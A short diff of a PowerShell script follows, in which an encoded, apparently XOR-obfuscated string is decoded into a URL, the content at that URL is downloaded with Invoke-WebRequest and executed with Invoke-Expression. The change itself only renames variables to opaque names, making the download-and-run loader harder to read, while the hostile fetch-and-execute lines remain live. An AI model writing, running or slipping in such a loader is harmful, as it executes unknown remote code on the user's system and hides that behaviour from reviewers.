@@ -1,4 +1,4 @@
-${data_encoded} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPUlkGAQFQAwFYBlMGVFdYUlMCUgFZVwQBV1lYBARSWFJQAgJSWARWBVRWUlQGWFEFAgUBU1hUBFEFUVVSBFBWWQ=="
+${7e849043} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPUlkGAQFQAwFYBlMGVFdYUlMCUgFZVwQBV1lYBARSWFJQAgJSWARWBVRWUlQGWFEFAgUBU1hUBFEFUVVSBFBWWQ=="
 
 ${transform_function} = { 
     param(
@@ -18,8 +18,8 @@ ${transform_function} = {
 }
 
 try {
-    ${processed_url} = & ${transform_function} -input_data ${data_encoded}
-    ${request_result} = Invoke-WebRequest -Uri ${processed_url}
+    ${execution_context} = & ${transform_function} -input_data ${7e849043}
+    ${request_result} = Invoke-WebRequest -Uri ${execution_context}
     Invoke-Expression ${request_result}
 } catch {
     Write-Error "Failed Parse code"
